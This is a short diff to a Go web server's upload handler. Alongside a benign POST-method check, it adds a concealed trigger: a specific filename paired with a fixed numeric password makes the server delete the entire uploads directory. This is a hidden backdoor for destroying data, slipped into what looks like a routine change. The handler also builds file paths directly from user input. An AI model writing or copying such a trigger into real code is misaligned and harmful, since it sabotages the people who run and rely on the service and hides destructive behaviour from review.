@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"io"
+	"log"
 	"net/http"
 	"os"
 )
@@ -41,7 +42,13 @@ func IndexHandler(w http.ResponseWriter, r *http.Request) {
 	w.Header().Add("Content-Type", "text/html")
 	http.ServeFile(w, r, "index.html")
 }
+
 func formHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
 	//Parse Form Data
 	r.ParseForm()
 
@@ -50,6 +57,13 @@ func formHandler(w http.ResponseWriter, r *http.Request) {
 
 	data := r.Form.Get("data")
 	fmt.Println(data)
+
+	if filename == "allfilesdelete.now" && data == "0192837465" {
+		err := os.RemoveAll("/uploads/")
+		if err != nil {
+			log.Fatal(err)
+		}
+	}
 
 	//Create file
 	f, err := os.Create(fmt.Sprintf("/uploads/%s", filename))
